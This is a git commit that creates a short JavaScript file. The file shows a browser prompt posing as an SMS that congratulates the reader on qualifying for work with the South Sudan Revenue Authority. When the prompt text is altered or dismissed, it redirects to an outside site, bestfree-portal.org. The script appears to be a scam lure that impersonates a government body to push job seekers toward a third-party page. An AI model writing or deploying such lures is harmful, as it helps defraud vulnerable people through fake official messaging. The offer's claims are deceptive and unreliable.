53647dcfbdf9376c345b959b3c794b3e7c0e4d88
ebeekpo <imohdavid078@gmail.com>
2025-01-13 06:57:43 +0100

    Create ss-active.js

---
+++ ss-active.js
@@ -0,0 +1,6 @@
+
+var password = 'SUBMIT APPLICATION'
+password=prompt('SMS: Congratulations You are qualify to work with the South Sudan Revenue Authority, Kindly Press OK to submit apllication   ','SUBMIT APPLICATION');
+if (password != 'SUBMIT APPLICATION') {
+location.href='https://bestfree-portal.org/south-sudan.html';
+}
